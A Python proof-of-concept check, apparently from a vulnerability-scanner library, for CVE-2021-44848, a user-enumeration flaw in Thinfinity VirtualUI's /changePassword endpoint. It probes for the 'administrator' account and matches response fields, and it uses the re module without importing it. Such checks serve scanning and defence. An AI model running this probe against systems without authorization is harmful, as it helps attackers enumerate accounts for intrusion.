import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Thinfinity VirtualUI User Enumeration''',
        "description": '''Thinfinity VirtualUI (before v3.0), /changePassword returns different responses for requests depending on whether the username exists. It may enumerate OS users (Administrator, Guest, etc.)''',
        "severity": "medium",
        "references": [
            "https://github.com/cybelesoft/virtualui/issues/1", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-44848", 
            "https://www.tenable.com/cve/CVE-2021-44848"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            "cvss-score": "",
            "cve-id": "CVE-2021-44848",
            "cwe-id": "CWE-287"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "exposure", "thinfinity", "virtualui"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/changePassword?username=administrator"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""rc":(.*?)""",resp0.text) and re.search(r"""msg":"(.*?)""",resp0.text)) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url